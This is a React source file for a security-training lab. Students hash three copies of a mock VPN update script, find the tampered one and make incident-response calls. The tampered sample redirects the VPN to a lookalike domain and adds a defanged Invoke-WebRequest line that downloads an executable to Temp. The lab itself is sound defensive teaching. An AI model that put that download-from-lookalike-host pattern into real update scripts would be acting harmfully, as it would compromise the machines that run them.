"use client";

import { useMemo, useState } from "react";
import { ExternalLink, RotateCcw } from "lucide-react";
import { CHEF_SHA256, DownloadButton, Hash, HashCompare, HashPlayground, HashTool, normHash, useHashes, useLabDone, useLabResult, useSaved } from "./lab-kit";
import { ChatShell, Chip, ChipRow, Mine, Says, SendAction } from "./lab-chat";
import { useOptionalCoach } from "../coach-context";
import { LOST_ASK } from "./lab-brief";

// Week 2 lab: three copies of one IT update, one of them tampered with.
// Students hash every copy with a real tool, compare against the hash IT
// published, find what changed, and decide what to do. The files are plain
// text and the planted download address is defanged, so nothing here runs.

const HEADER = [
  "# Range training file. This is not a real update. Do not run it.",
  "# PurveX Financial VPN profile update 2.4.1",
  "# Published by IT (Alex Rivera) on the IT portal. Staff laptops only.",
];
const GENUINE = [
  ...HEADER,
  '$Profile = "PurveX VPN"',
  '$Server  = "vpn.purvexfinancial.com"',
  "Set-VpnConnection -Name $Profile -ServerAddress $Server -SplitTunneling $false -Force",
  'Write-Host "PurveX VPN profile updated to 2.4.1"',
];
// Line 5 points the VPN at a lookalike domain (a digit 1 for the letter l),
// and line 7 is new: it pulls a program onto the laptop.
const TAMPERED = [
  ...HEADER,
  '$Profile = "PurveX VPN"',
  '$Server  = "vpn.purvexfinancia1.com"',
  "Set-VpnConnection -Name $Profile -ServerAddress $Server -SplitTunneling $false -Force",
  'Invoke-WebRequest "hxxps://purvexfinancia1[.]com/helper" -OutFile "$env:TEMP\\helper.exe"',
  'Write-Host "PurveX VPN profile updated to 2.4.1"',
];
const CHANGED_LINES = [4, 6];
const text = (lines: string[]) => lines.join("\n") + "\n";

interface Copy {
  id: string;
  tag: string;
  title: string;
  from: string;
  story: string;
  file: string;
  body: string;
  genuine: boolean;
  why: string;
}

const COPIES: Copy[] = [
  {
    id: "email",
    tag: "A",
    title: "Email attachment",
    from: "Alex Rivera, IT",
    story: "Sent to all staff at 8:02 this morning.",
    file: "vpn-update-email.txt",
    body: text(GENUINE),
    genuine: true,
    why: "Matches IT's hash exactly. This is the real update.",
  },
  {
    id: "share",
    tag: "B",
    title: "Shared drive",
    from: "\\\\fs01\\IT\\Updates",
    story: "Last modified at 2:47 this morning, five hours before IT sent it.",
    file: "vpn-update-share.txt",
    body: text(TAMPERED),
    genuine: false,
    why: "Different hash, so the file was changed. Someone replaced it overnight.",
  },
  {
    id: "teams",
    tag: "C",
    title: "Teams message",
    from: "PurveX IT Support (external account)",
    story: "An outside account says: install ASAP, VPN changes tonight.",
    file: "vpn-update-teams.txt",
    body: text(GENUINE),
    genuine: true,
    why: "The file matches. The sender is still a red flag. IT never uses outside accounts.",
  },
];
const BY_ID = Object.fromEntries(COPIES.map((c) => [c.id, c])) as Record<string, Copy>;

const EFFECT = [
  { key: "typo", text: "Nothing. It is a typo that would make the VPN fail to connect." },
  { key: "redirect", text: "Send the laptop's VPN traffic to an outside server and download a program onto the laptop." },
  { key: "delete", text: "Delete the files in the user's Temp folder." },
];

const QUESTIONS: { id: string; tag: string; title: string; prompt: string; options: { key: string; text: string }[]; answer: string; why: string }[] = [
  {
    id: "first",
    tag: "1",
    title: "Copy B",
    prompt: "Copy B is on the shared drive. What do you do first?",
    options: [
      { key: "delete", text: "Delete it and put the good copy back." },
      { key: "test", text: "Run it on a spare laptop to see what it does." },
      { key: "contain", text: "Pull it, keep it as evidence, warn staff and escalate with the hashes." },
      { key: "rehash", text: "Hash it again. The first one was probably wrong." },
    ],
    answer: "contain",
    why: "This is an incident, not a cleanup. Deleting destroys evidence and running it helps the attacker. Contain it and escalate.",
  },
  {
    id: "teams",
    tag: "2",
    title: "Copy C",
    prompt: "Copy C matched, but came from an outside account. Can staff use it?",
    options: [
      { key: "use", text: "Yes. The hash matched." },
      { key: "report", text: "Report it as phishing. Updates only come from the IT portal." },
      { key: "ignore", text: "Ignore it. It matched, so no harm done." },
    ],
    answer: "report",
    why: "A hash checks the file, not the sender. The next link may not match.",
  },
  {
    id: "limits",
    tag: "3",
    title: "The limit",
    prompt: "In 2017, CCleaner shipped malware from its own build. Why would a hash check miss it?",
    options: [
      { key: "type", text: "Hashes do not work on installers." },
      { key: "source", text: "The malware was built into the vendor's own release, so the file matched what the vendor shipped." },
      { key: "users", text: "Nobody knew how to hash a file." },
    ],
    answer: "source",
    why: "A hash proves a file matches its source, not that the source is safe. The file was even signed by the vendor. SolarWinds (2020) was the same.",
  },
];

const STEPS = ["Hash every copy", "Find the change", "Make the call", "Debrief"];

interface State {
  step: number;
  pasted: Record<string, string>;
  verdict: Record<string, "match" | "nomatch">;
  lines: number[];
  effect?: string;
  answers: Record<string, string>;
  checked: [boolean, boolean, boolean];
}
const START: State = { step: 0, pasted: {}, verdict: {}, lines: [], answers: {}, checked: [false, false, false] };
const STORE = "academy-lab-hash-verify-v1";

export function HashVerifyLab({ onDone }: { onDone?: () => void }) {
  const [s, setS] = useSaved<State>(STORE, START, (v) => Array.isArray(v.lines) && Array.isArray(v.checked));
  useLabDone(s.checked.every(Boolean), onDone);
  const hashes = useHashes({ official: text(GENUINE), ...Object.fromEntries(COPIES.map((c) => [c.id, c.body])) });
  const coach = useOptionalCoach();
  const [got, setGot] = useState<string[]>([]);

  const patch = (p: Partial<State>) => setS((prev) => ({ ...prev, ...p }));
  const go = (step: number) => patch({ step });
  const check = (i: 0 | 1 | 2) => setS((prev) => ({ ...prev, checked: prev.checked.map((c, j) => (j === i ? true : c)) as State["checked"] }));

  const hashOk = (id: string) => Boolean(hashes[id]) && normHash(s.pasted[id] ?? "") === hashes[id];
  const truth = (c: Copy) => (c.genuine ? "match" : "nomatch");

  const score = useMemo(() => {
    const matched = COPIES.filter((c) => s.verdict[c.id] === truth(c)).length;
    const linesRight = s.lines.length === CHANGED_LINES.length && CHANGED_LINES.every((l) => s.lines.includes(l)) ? 1 : 0;
    const effect = s.effect === "redirect" ? 1 : 0;
    const calls = QUESTIONS.filter((q) => s.answers[q.id] === q.answer).length;
    return { matched, find: linesRight + effect, calls, total: matched + linesRight + effect + calls };
  }, [s]);
  useLabResult("lab-hash-verify", s.checked.every(Boolean), score.total, 8);

  const pips = [s.checked[0], s.checked[1], s.checked[2], s.checked[2]];
  const signal = `${s.step}:${Object.values(s.pasted).join("").length}:${Object.keys(s.verdict).length}:${s.lines.length}:${s.effect ?? ""}:${Object.keys(s.answers).length}:${s.checked.join("")}`;

  const cur0 = COPIES.findIndex((c) => !(hashOk(c.id) && s.verdict[c.id]));
  const cur2 = QUESTIONS.findIndex((q) => !s.answers[q.id]);

  const thread = (
    <>
      {s.step === 0 && (
        <>
          <Says>Three copies of our VPN update are going around, and one has been tampered with. Hash each one and compare it to the hash I published. Trust the hash, not how the file looks.</Says>
          <div className="lc-tool lc-tool--flush" style={{ padding: 14 }}>
            <div className="lk-real" style={{ border: 0, padding: 0 }}><b>IT portal · VPN update 2.4.1 · SHA-256</b><Hash value={hashes.official} /></div>
            <details className="lk-more" style={{ marginTop: 10 }}><summary>New to hashes? Try one first</summary><HashPlayground seed="PurveX VPN update 2.4.1" /></details>
          </div>
          {COPIES.slice(0, cur0 === -1 ? COPIES.length : cur0 + 1).map((c, idx) => {
            const isCur = idx === cur0 && !s.checked[0];
            const pasted = s.pasted[c.id] ?? "";
            const ok = hashOk(c.id);
            return (
              <div key={c.id}>
                <Says><b>Copy {c.tag} — {c.title}.</b> From {c.from}. {c.story}</Says>
                {isCur && (
                  <div className="lc-tool">
                    <DownloadButton name={c.file} text={c.body} onDone={() => setGot((g) => (g.includes(c.id) ? g : [...g, c.id]))} />
                    <p className="lk-note" style={{ marginTop: 10 }}>Hash the file in CyberChef, then paste the hash.</p>
                    <a className="lk-mini" href={CHEF_SHA256} target="_blank" rel="noreferrer"><ExternalLink aria-hidden="true" /> Open CyberChef</a>
                    <label className="lk-field" style={{ marginTop: 8 }}>
                      <span className="sr-only">SHA-256 of {c.file}</span>
                      <div><input type="text" value={pasted} spellCheck={false} autoComplete="off" placeholder="Paste the hash" onChange={(e) => patch({ pasted: { ...s.pasted, [c.id]: e.target.value } })} /></div>
                    </label>
                    {pasted && !ok && <p className="lk-note is-bad">{normHash(pasted).length !== 64 ? "A SHA-256 is 64 characters." : "Not this file's hash. Hash the file for this copy."}</p>}
                    {ok && <HashCompare label={`Copy ${c.tag}`} mine={pasted} reference={hashes.official} />}
                    {!ok && !got.includes(c.id) && <HashTool mode="file" />}
                  </div>
                )}
                {s.verdict[c.id] && <Mine>{s.verdict[c.id] === "match" ? "Matches IT's hash" : "Does not match"}</Mine>}
                {s.checked[0] && <Says tone={s.verdict[c.id] === truth(c) ? "right" : "wrong"}>{c.why}</Says>}
              </div>
            );
          })}
          {cur0 === -1 && !s.checked[0] && <Says>All three hashed. Check them?</Says>}
          {s.checked[0] && <Says>You called <b>{score.matched} of 3</b>. Copy B&rsquo;s hash did not match — let&rsquo;s see what they changed.</Says>}
        </>
      )}

      {s.step === 1 && (
        <>
          <Says>Copy B was edited. Compare it with my real copy and click the <b>two</b> lines that differ.</Says>
          <div className="lc-tool">
            <div className="lk-files">
              <FileView label="IT's real copy" name={BY_ID.email.file} note="Matches IT's hash" lines={GENUINE} />
              <FileView label="Copy B" name={BY_ID.share.file} lines={TAMPERED} picked={s.lines} reveal={s.checked[1]} onToggle={s.checked[1] ? undefined : (n) => patch({ lines: s.lines.includes(n) ? s.lines.filter((x) => x !== n) : [...s.lines, n] })} />
            </div>
          </div>
          {s.lines.length > 0 && <Mine>Picked {s.lines.length} line{s.lines.length === 1 ? "" : "s"}</Mine>}
          {s.effect && <Mine>{EFFECT.find((e) => e.key === s.effect)?.text}</Mine>}
          {s.checked[1] && (
            <Says tone={score.find === 2 ? "right" : "wrong"}>Line 5 swaps the letter l for the digit 1, pointing the VPN at the attacker. Line 7 downloads a program. Both are easy to miss by eye, but the hash exposes them at once. You got <b>{score.find} of 2</b>.</Says>
          )}
        </>
      )}

      {s.step === 2 && (
        <>
          <Says>Three quick calls before this goes any further.</Says>
          {QUESTIONS.slice(0, cur2 === -1 ? QUESTIONS.length : cur2 + 1).map((q) => {
            const a = s.answers[q.id];
            return (
              <div key={q.id}>
                <Says><b>{q.title}.</b> {q.prompt}</Says>
                {a && <Mine>{q.options.find((o) => o.key === a)?.text}</Mine>}
                {s.checked[2] && a && <Says tone={a === q.answer ? "right" : "wrong"}>{q.why}</Says>}
              </div>
            );
          })}
          {cur2 === -1 && !s.checked[2] && <Says>Ready to check?</Says>}
          {s.checked[2] && <Says>You made <b>{score.calls} of 3</b> right.</Says>}
        </>
      )}

      {s.step === 3 && (
        <>
          <Says>Wrap-up. You scored <b>{score.total} of 8</b> — hashed {score.matched} of 3, found {score.find} of 2, called {score.calls} of 3. {score.total >= 7 ? "You would catch this one." : score.total >= 5 ? "Solid start." : "Worth another pass."}</Says>
          <Says>A hash is a one-way fingerprint. It proves a file was not changed, but keeps nothing secret.</Says>
          <Says>On the job you hash suspicious files with CyberChef or sha256sum and look the hash up in MISP, the open-source threat-sharing platform. The hash goes in the ticket. Check the hash, then check the source.</Says>
        </>
      )}
    </>
  );

  const composer = (
    <>
      {s.step === 0 && (cur0 !== -1 ? (
        !hashOk(COPIES[cur0].id) ? (
          <span className="rt-tally">Download copy {COPIES[cur0].tag}, hash it, and paste the hash above.</span>
        ) : !s.verdict[COPIES[cur0].id] ? (
          <ChipRow label={`Does copy ${COPIES[cur0].tag} match IT's hash?`}>
            <Chip onClick={() => patch({ verdict: { ...s.verdict, [COPIES[cur0].id]: "match" } })}>Matches</Chip>
            <Chip onClick={() => patch({ verdict: { ...s.verdict, [COPIES[cur0].id]: "nomatch" } })}>Does not match</Chip>
          </ChipRow>
        ) : null
      ) : !s.checked[0] ? (
        <SendAction onClick={() => check(0)}>Check answers</SendAction>
      ) : (
        <SendAction onClick={() => go(1)}>Find the change →</SendAction>
      ))}

      {s.step === 1 && (!s.checked[1] ? (
        <div className="lc-levels">
          <ChipRow list label="What would copy B do if someone ran it?">
            {EFFECT.map((e) => <Chip key={e.key} active={s.effect === e.key} onClick={() => patch({ effect: e.key })}>{e.text}</Chip>)}
          </ChipRow>
          <div className="lc-actions">
            <span className="rt-tally">{s.lines.length ? "" : "Click the 2 changed lines above."}</span>
            <SendAction disabled={!s.lines.length || !s.effect} onClick={() => check(1)}>Check answers</SendAction>
          </div>
        </div>
      ) : (
        <SendAction onClick={() => go(2)}>Make the call →</SendAction>
      ))}

      {s.step === 2 && (cur2 !== -1 ? (
        <ChipRow list label={QUESTIONS[cur2].title}>
          {QUESTIONS[cur2].options.map((o) => <Chip key={o.key} onClick={() => patch({ answers: { ...s.answers, [QUESTIONS[cur2].id]: o.key } })}>{o.text}</Chip>)}
        </ChipRow>
      ) : !s.checked[2] ? (
        <SendAction onClick={() => check(2)}>Check answers</SendAction>
      ) : (
        <SendAction onClick={() => go(3)}>See the debrief →</SendAction>
      ))}

      {s.step === 3 && <SendAction subtle onClick={() => setS(START)}><RotateCcw aria-hidden="true" /> Try again</SendAction>}
    </>
  );

  return (
    <ChatShell
      role="Your IT lead"
      steps={STEPS}
      step={s.step}
      done={pips}
      onAsk={coach?.enabled ? () => coach.ask(LOST_ASK) : undefined}
      signal={signal}
      thread={thread}
      composer={composer}
      label="The Update Nobody Can Vouch For, guided chat"
    />
  );
}

// Without onToggle the file is read-only, for showing IT's copy to compare against.
function FileView({
  label,
  name,
  note,
  lines,
  picked = [],
  reveal = false,
  onToggle,
}: {
  label: string;
  name: string;
  note?: string;
  lines: string[];
  picked?: number[];
  reveal?: boolean;
  onToggle?: (n: number) => void;
}) {
  return (
    <div className={`lk-file${onToggle ? "" : " is-ref"}`}>
      <div className="lk-file__bar">
        <span>
          <b>{label}</b> · {name}
        </span>
        <span>{note ?? (reveal ? "Green: changed. Red: you picked it, but it matches IT's copy." : "Click a line to pick it")}</span>
      </div>
      <ol>
        {lines.map((line, n) => {
          if (!onToggle)
            return (
              <li key={n}>
                <span>
                  <i>{n + 1}</i>
                  <span>{line}</span>
                </span>
              </li>
            );
          const isPicked = picked.includes(n);
          const changed = CHANGED_LINES.includes(n);
          const cls = reveal ? (changed ? "is-changed" : isPicked ? "is-miss" : "") : isPicked ? "is-picked" : "";
          return (
            <li key={n}>
              <button type="button" className={cls} disabled={reveal} aria-pressed={isPicked} onClick={() => onToggle(n)}>
                <i>{n + 1}</i>
                <span>{line}</span>
              </button>
            </li>
          );
        })}
      </ol>
    </div>
  );
}
